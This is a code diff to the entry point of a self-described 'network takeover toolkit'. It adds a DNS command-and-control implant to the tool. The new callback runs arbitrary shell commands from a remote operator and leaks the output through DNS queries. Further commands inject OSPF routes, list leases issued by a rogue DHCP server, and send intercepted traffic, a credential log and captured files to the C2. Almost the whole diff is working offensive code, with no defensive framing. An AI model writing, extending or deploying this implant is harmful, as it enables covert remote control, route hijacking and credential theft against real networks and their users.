@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-# v3.1
+# v3.2
 """
 main.py — network takeover toolkit entry point.
 
@@ -149,8 +149,9 @@ def _init_c2(args) -> dict | None:
         print_step("WARN", "C2 handshake failed — continuing without remote mode")
         return None
 
-    _c2.start_command_poll(args.domain, dns_server)
-    print_step("OK", f"C2 ready — command poll every {_c2.COMMAND_POLL_INTERVAL}s")
+    # Command poll is started later (after OSPF/DHCP setup) so the execute_cb
+    # can reference the fully-initialised agent state.
+    print_step("OK", "C2 handshake complete — command poll will start after setup")
     return {"domain": args.domain, "dns_server": dns_server, "agent_id": agent_id}
 
 
@@ -269,6 +270,163 @@ def _transmit_to_c2(c2_config: dict) -> None:
         print("  Nothing to transmit — no credentials or intercepted files yet.")
     else:
         print(f"  Transmitted {sent} file(s) to C2.")
+
+
+# Serialise stdout captures so concurrent threads don't interleave into the buffer.
+_output_capture_lock = threading.Lock()
+
+
+def _capture_output(func, *args, **kwargs) -> str:
+    import io
+    buf = io.StringIO()
+    with _output_capture_lock:
+        old, sys.stdout = sys.stdout, buf
+        try:
+            func(*args, **kwargs)
+        finally:
+            sys.stdout = old
+    return buf.getvalue()
+
+
+def _make_remote_cb(c2_config: dict, agent_state: dict):
+    """
+    Build the execute_cb for dns_c2.start_command_poll in --remote mode.
+
+    The returned callback dispatches structured commands sent from c2_server.py
+    to agent-side functions and exfiltrates their output as DNS A-query chunks.
+
+    Command protocol (sent as the b32-decoded TXT value):
+      bash:<cmd>             run shell command, exfil stdout+stderr
+      menu:svis              exfil OSPF Hello sources and LSDB subnets
+      menu:neighbors         exfil live OSPF neighbour table
+      menu:lsdb              exfil live LSDB entries
+      menu:inject:<prefix>   inject OSPF stub route (CIDR or addr/mask notation)
+      menu:leases            exfil active DHCP leases issued by the rogue server
+      menu:creds             exfil intercepted traffic listing and credential log
+      menu:exfil             transmit all intercepted files + cred log to C2
+      menu:status            exfil a brief agent status summary
+    """
+    import subprocess as _sp
+    import ipaddress as _ip
+    import dns_c2 as _c2
+
+    domain     = c2_config["domain"]
+    dns_server = c2_config["dns_server"]
+    agent_id   = c2_config["agent_id"]
+
+    def _send(tag: str, text: str) -> None:
+        _c2.exfiltrate(f"[{tag}]\n{text}", domain, dns_server)
+
+    def cb(cmd: str) -> None:
+        # ── Shell execution ────────────────────────────────────────────────────
+        if cmd.startswith("bash:"):
+            shell_cmd = cmd[5:]
+            print(f"[C2] Executing: {shell_cmd}")
+            try:
+                r = _sp.run(shell_cmd, shell=True, capture_output=True,
+                            text=True, timeout=30)
+                out = r.stdout + r.stderr or f"[exit {r.returncode}]"
+            except _sp.TimeoutExpired:
+                out = "[ERROR] timed out after 30s"
+            except Exception as exc:
+                out = f"[ERROR] {exc}"
+            _c2.exfiltrate(out, domain, dns_server)
+            return
+
+        # Legacy format support ("bash <cmd>") from dns_tunnel_server sessions.
+        if cmd.lower().startswith("bash "):
+            return cb(f"bash:{cmd[5:]}")
+
+        if not cmd.startswith("menu:"):
+            _send("UNKNOWN", f"Unrecognised command: {cmd!r}")
+            return
+
+        sub = cmd[5:]  # strip "menu:"
+        ctx = agent_state.get("ospf_context")
+
+        # ── OSPF SVIs & subnets ───────────────────────────────────────────────
+        if sub == "svis":
+            out = _capture_output(_show_ospf_networks,
+                                  agent_state.get("ospf_hellos") or [],
+                                  agent_state.get("lsdb_subnets"))
+            _send("OSPF-SVIs", out or "(no data)")
+
+        # ── Live OSPF neighbours ──────────────────────────────────────────────
+        elif sub == "neighbors":
+            if not ctx:
+                _send("ERROR", "OSPF engine not running in-process.")
+            else:
+                out = _capture_output(ospf_adjacency.show_neighbors, ctx)
+                _send("OSPF-NEIGHBORS", out or "(none)")
+
+        # ── Live LSDB ─────────────────────────────────────────────────────────
+        elif sub == "lsdb":
+            if not ctx:
+                _send("ERROR", "OSPF engine not running in-process.")
+            else:
+                lsas = ospf_adjacency.local_lsdb_entries(ctx)
+                rows = [
+                    f"type={l.type}  id={l.id}  adv={l.adrouter}"
+                    f"  seq=0x{getattr(l, 'seq', 0):08x}  age={getattr(l, 'age', 0)}s"
+                    for l in lsas
+                ] or ["(LSDB empty)"]
+                _send("OSPF-LSDB", "\n".join(rows))
+
+        # ── OSPF route injection ──────────────────────────────────────────────
+        elif sub.startswith("inject:"):
+            if not ctx:
+                _send("ERROR", "OSPF engine not running.")
+            elif not ctx["adjacency_ready_event"].is_set():
+                _send("ERROR", "No FULL adjacency yet — wait before injecting.")
+            else:
+                spec = sub[7:]   # e.g. "10.0.0.0/24" or "10.0.0.0/255.255.255.0"
+                try:
+                    net    = _ip.IPv4Network(spec, strict=False)
+                    prefix = str(net.network_address)
+                    mask   = str(net.netmask)
+                except ValueError:
+                    _send("ERROR",
+                          f"Cannot parse prefix {spec!r}. "
+                          "Use CIDR (10.0.0.0/24) or addr/mask.")
+                    return
+                ospf_adjacency.add_router_stub_route(ctx, prefix, mask)
+                _send("INJECT-OK", f"Injected OSPF stub: {prefix}/{mask}")
+
+        # ── Active DHCP leases ────────────────────────────────────────────────
+        elif sub == "leases":
+            out = _capture_output(_show_leases, agent_state.get("networks") or [])
+            _send("LEASES", out or "(no leases yet)")
+
+        # ── Intercepted traffic + credential log listing ──────────────────────
+        elif sub == "creds":
+            out = _capture_output(_show_intercepted)
+            _send("INTERCEPTED", out or "(nothing yet)")
+
+        # ── Exfiltrate all captured files + cred log ──────────────────────────
+        elif sub == "exfil":
+            _transmit_to_c2(c2_config)
+
+        # ── Agent status summary ──────────────────────────────────────────────
+        elif sub == "status":
+            nets   = agent_state.get("networks") or []
+            leases = sum(len(n.get("leased_addresses", [])) for n in nets)
+            adj    = "FULL" if (ctx and ctx["adjacency_ready_event"].is_set()) else "not ready"
+            nbrs   = len(ctx.get("neighbors", {})) if ctx else 0
+            sd     = agent_state.get("server_details") or {}
+            _send("STATUS", (
+                f"agent_id    : {agent_id}\n"
+                f"domain      : {domain}\n"
+                f"resolver    : {dns_server}\n"
+                f"ospf        : {adj}  neighbors={nbrs}\n"
+                f"dhcp_leases : {leases}\n"
+                f"server_ip   : {sd.get('source_ip', '?')}\n"
+                f"relay_ip    : {sd.get('relay_ip', '?')}\n"
+            ))
+
+        else:
+            _send("UNKNOWN", f"Unknown menu command: {sub!r}")
+
+    return cb
 
 
 def debug_menu(networks: list, proposed_leases: dict, server_details: dict,
@@ -487,7 +645,7 @@ def start_http_intercept(sniff_iface, our_ips=None):
 # ── Entry point ───────────────────────────────────────────────────────────────
 
 def main():
-    print("Network Takeover Toolkit v3.1 — Starting...")
+    print("Network Takeover Toolkit v3.2 — Starting...")
     args = _parse_args()
     interface = DEFAULT_INTERFACE  # set in dhcp_takeover.py
 
@@ -562,15 +720,36 @@ def main():
             our_ips.add(loopback_alias_ip)
         start_http_intercept(tun_iface or ospf_interface, our_ips=our_ips)
 
-        # ── Debug console — runs in background while Phase 7 blocks ──────────
-        debug_thread = threading.Thread(
-            target=debug_menu,
-            args=(networks, proposed_leases, server_details, c2_config,
-                  ospf_hellos, lsdb_subnets, ospf_context),
-            daemon=True,
-            name="debug-menu",
-        )
-        debug_thread.start()
+        # ── Remote C2 poll OR local debug console ────────────────────────────
+        # In --remote mode the operator drives everything from c2_server.py;
+        # no local input is needed.  In local mode the debug menu runs as a
+        # background thread while Phase 7 blocks.
+        if c2_config:
+            import dns_c2 as _c2
+            agent_state = {
+                "networks":       networks,
+                "proposed_leases": proposed_leases,
+                "server_details": server_details,
+                "ospf_context":   ospf_context,
+                "lsdb_subnets":   lsdb_subnets,
+                "ospf_hellos":    ospf_hellos,
+            }
+            _c2.start_command_poll(
+                c2_config["domain"], c2_config["dns_server"],
+                agent_id=c2_config["agent_id"],
+                execute_cb=_make_remote_cb(c2_config, agent_state),
+            )
+            print_step("OK",
+                       f"C2 command poll active (every {_c2.COMMAND_POLL_INTERVAL}s) "
+                       "— all menu functions available remotely")
+        else:
+            threading.Thread(
+                target=debug_menu,
+                args=(networks, proposed_leases, server_details, None,
+                      ospf_hellos, lsdb_subnets, ospf_context),
+                daemon=True,
+                name="debug-menu",
+            ).start()
 
         # ── Phase 7: rogue DHCP server (blocking) ────────────────────────────
         relay_mode = (
